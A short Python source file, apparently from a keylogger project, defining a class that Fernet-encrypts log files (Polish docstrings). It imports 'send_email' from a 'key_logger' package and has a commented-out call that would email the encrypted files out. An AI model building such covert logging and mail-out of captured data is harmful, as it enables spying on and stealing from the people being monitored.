from cryptography.fernet import Fernet
from time import sleep
import os

from key_logger.mail import send_email
from settings import key_filename, filenames
from crypto.KeyGenerator import KeyGenerator


class Encryption:
    def __init__(self, file_path):
        self.path = file_path
        self.file_path = file_path + "\\"

        self.key = self.get_key()

        self.files_to_encrypt = []
        self.encrypted_file_names = []

        for _, filename in filenames.items():
            self.files_to_encrypt.append(self.file_path + filename)
            pivot = filename.find(".txt")
            self.encrypted_file_names.append(self.file_path + filename[:pivot] + "_e" + filename[pivot:])

        self.encrypt()

    def encrypt(self):
        """
            Metoda szyfrujaca podany przez konstruktor plik za pomocą biblioteki fernet
            :return:
        """
        for count, encrypting_file in enumerate(self.files_to_encrypt):
            if os.path.isfile(self.files_to_encrypt[count]):
                with open(self.files_to_encrypt[count], 'rb') as f:
                    data = f.read()

                fernet = Fernet(self.key)
                encrypted = fernet.encrypt(data)

                with open(self.encrypted_file_names[count], 'wb') as f:
                    f.write(encrypted)
                return encrypted
                # send_email(self.encrypted_file_names[count], self.encrypted_file_names[count])

    def get_key(self):
        """
           Pobiera klucz pozwalający na zaszyfrowanie/odszyfowanie danych
           :return:
       """
        key_path = "\\".join([self.path, key_filename])
        if not os.path.isfile(key_path):
            KeyGenerator(self.file_path)
        with open(key_path, 'rb') as f:
            key = f.read()
        return key
